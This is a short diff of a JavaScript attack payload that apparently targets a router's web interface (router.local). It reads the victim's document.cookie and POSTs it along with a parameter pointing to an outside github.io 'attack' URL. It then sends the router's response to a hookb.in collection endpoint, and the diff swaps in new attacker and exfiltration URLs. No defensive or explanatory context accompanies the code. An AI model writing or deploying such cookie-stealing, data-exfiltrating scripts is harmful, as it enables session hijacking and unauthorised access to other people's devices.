@@ -3,13 +3,13 @@ const http = new XMLHttpRequest();
 //http://router.local/home.php?action=view&
 //http://router.local/view.php
 const cook = document.cookie;
-http.open('POST', 'http://router.local/home.php?action=http://nastassiagodson.github.io/attack&'+cook, true);
+http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/6JnzyYjLymhoRnwwYrjk', true);
+                xhr.open('POST', 'https://hookb.in/yDwmxXwVbPtG9yjjwZPa', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
 
